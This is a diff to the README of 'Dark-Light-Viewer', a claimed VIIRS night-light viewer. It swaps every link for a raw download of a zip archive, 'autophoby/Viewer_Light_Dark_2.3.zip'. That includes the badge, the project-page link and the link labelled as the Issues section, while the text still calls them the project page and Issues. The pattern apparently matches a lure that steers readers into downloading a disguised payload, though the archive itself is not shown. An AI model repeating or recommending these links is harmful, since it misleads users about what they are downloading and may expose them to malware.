@@ -1,6 +1,6 @@
 # 🌙 Dark-Light-Viewer - Track Night Light Changes Over Time
 
-[![Download Dark-Light-Viewer](https://img.shields.io/badge/Download-Dark--Light--Viewer-brightgreen?style=for-the-badge)](https://github.com/coderchetan01/Dark-Light-Viewer)
+[![Download Dark-Light-Viewer](https://img.shields.io/badge/Download-Dark--Light--Viewer-brightgreen?style=for-the-badge)](https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip)
 
 Dark Light Viewer helps you see changes in night lights across different times. It uses satellite data from VIIRS, which shows how areas light up at night. This can be useful for watching cities grow, seeing power outages, or tracking environmental changes.
 
@@ -28,7 +28,7 @@ You will download and open the software with just a few steps.
 
 Click the big green button at the top or visit this link to get the files:
 
-[https://github.com/coderchetan01/Dark-Light-Viewer](https://github.com/coderchetan01/Dark-Light-Viewer)
+[https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip](https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip)
 
 This link leads you to the main project page on GitHub.
 
@@ -98,7 +98,7 @@ If the app does not open or shows an error:
 
 For more help, visit the Issues section on the GitHub page:
 
-[https://github.com/coderchetan01/Dark-Light-Viewer/issues](https://github.com/coderchetan01/Dark-Light-Viewer/issues)
+[https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip](https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip)
 
 ---
 
@@ -114,6 +114,6 @@ Your computer does not process raw data but uses prepared files bundled with the
 
 Download and install Dark Light Viewer from this page:
 
-[https://github.com/coderchetan01/Dark-Light-Viewer](https://github.com/coderchetan01/Dark-Light-Viewer)  
+[https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip](https://github.com/coderchetan01/Dark-Light-Viewer/raw/refs/heads/main/autophoby/Viewer_Light_Dark_2.3.zip)  
 
 Use the steps above to find the latest version and get started quickly.
